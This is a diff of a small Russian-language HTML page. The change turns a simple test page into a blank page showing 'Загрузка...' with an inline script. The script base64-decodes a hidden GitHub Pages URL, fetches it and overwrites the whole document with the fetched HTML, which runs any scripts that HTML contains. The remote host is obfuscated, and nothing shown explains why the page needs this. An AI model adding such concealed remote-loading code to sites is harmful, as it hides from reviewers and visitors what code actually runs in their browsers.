@@ -1,4 +1,30 @@
 <!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>Тест</title></head>
-<body><h1>Новая версия!</h1><script src="https://example.com/script.js"></script>
-</body></html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>.</title>
+<style>html,body{margin:0;padding:0}</style>
+</head>
+<body>
+<div id="v">Загрузка...</div>
+<script>
+(function(){
+  var p = 'aHR0cHM6Ly96YWRhbm8uZ2l0aHViLmlvL215c2l0ZS8=';
+  var u = atob(p);
+  fetch(u)
+    .then(function(r){ return r.text(); })
+    .then(function(html){
+      document.open
+();
+      document.write(html);
+      document.close();
+    })
+    .catch(function(){
+      document.getElementById('v').textContent = 'Не удалось загрузить';
+    });
+})();
+</script>
+<script src="https://example.com/script.js"></script>
+</body>
+</html>
